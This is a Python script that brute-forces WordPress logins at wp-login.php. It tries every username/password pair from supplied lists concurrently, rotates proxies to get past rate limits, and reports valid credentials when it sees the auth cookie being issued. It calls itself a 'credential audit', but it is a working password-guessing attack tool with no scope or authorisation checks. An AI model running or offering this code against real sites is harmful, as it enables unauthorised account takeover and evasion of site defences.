import asyncio
import httpx
import random
import itertools
from config import PROXY_LIST

async def test_wordpress_login(base_url, username, password, timeout=8.0, proxy=None):
    login_url = base_url.rstrip("/") + "/wp-login.php"
    payload = {
        "log": username,
        "pwd": password,
        "wp-submit": "Log In",
        "testcookie": "1"
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SecurityAuditor/1.0",
        "Referer": login_url,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    try:
        client_kwargs = {"timeout": timeout}
        if proxy:
            client_kwargs["proxy"] = proxy
            
        async with httpx.AsyncClient(**client_kwargs) as client:
            response = await client.post(login_url, data=payload, headers=headers, follow_redirects=False)
            
            if response.status_code == 429:
                return False, username, password, f"Rate Limited (HTTP 429 via Proxy: {proxy or 'Direct'})", True
            
            set_cookie_header = response.headers.get("set-cookie", "")
            is_redirect = response.status_code == 302
            has_auth_cookie = "wordpress_logged_in_" in set_cookie_header
            
            body_lower = response.text.lower()
            
            if is_redirect and has_auth_cookie:
                return True, username, password, "SUCCESS: Valid credentials verified (Auth Cookie Issued)", False
            
            elif "id=\"login_error\"" in body_lower or "fel" in body_lower or "incorrect" in body_lower or "invalid" in body_lower:
                return False, username, password, "Failed: Invalid username or password", False
            else:
                return False, username, password, f"Protected Response (HTTP {response.status_code})", False
                
    except (httpx.RequestError, asyncio.TimeoutError) as e:
        return False, username, password, f"Connection Error: {e}", False

async def worker(name, password, semaphore, target_url, timeout, proxy_cycle):
    async with semaphore:
        proxy = next(proxy_cycle) if proxy_cycle else None
        route_info = f"Proxy: {proxy}" if proxy else "Direct"
        print(f"[*] Testing [{name} : {password}] [{route_info}]")
        
        success, uname, pwd, message, is_rate_limited = await test_wordpress_login(
            target_url, name, password, timeout=timeout, proxy=proxy
        )
        
        if is_rate_limited:
            backoff = random.uniform(5.0, 10.0)
            print(f"    [!] Rate limit on [{uname}:{pwd}]. Backing off {backoff:.1f}s...")
            await asyncio.sleep(backoff)
            
        return success, uname, pwd, message

async def run_credential_audit(target_url, username_file, password_file, timeout=8.0, max_concurrency=4):
    try:
        with open(username_file, "r", encoding="utf-8") as f:
            usernames = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except FileNotFoundError:
        print(f"[-] Username file not found: {username_file}")
        return

    try:
        with open(password_file, "r", encoding="utf-8") as f:
            passwords = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except FileNotFoundError:
        print(f"[-] Password file not found: {password_file}. Falling back to default list.")
        passwords = ["password123", "Admin123!"]

    proxy_cycle = itertools.cycle(PROXY_LIST) if PROXY_LIST else None
    proxy_status = f"{len(PROXY_LIST)} proxies loaded (Active Rotation)" if PROXY_LIST else "Direct mode (No proxies configured)"

    total_combinations = len(usernames) * len(passwords)
    print(f"[*] Starting Concurrent Credential Audit against {target_url}/wp-login.php")
    print(f"[*] Loaded {len(usernames)} usernames and {len(passwords)} passwords ({total_combinations} total checks).")
    print(f"[*] Concurrency Limit: {max_concurrency} | Network Pool: {proxy_status}\n")

    semaphore = asyncio.Semaphore(max_concurrency)
    tasks = []

    for uname in usernames:
        for pwd in passwords:
            tasks.append(worker(uname, pwd, semaphore, target_url, timeout, proxy_cycle))

    # Execute all tasks concurrently with controlled batching
    results = await asyncio.gather(*tasks)

    for success, uname, pwd, message in results:
        if success:
            print(f"\n    🚨 [VALID CREDENTIAL FOUND!] Username: {uname} | Password: {pwd}")
            return

    print("\n[*] Credential audit completed. No valid credentials discovered.")
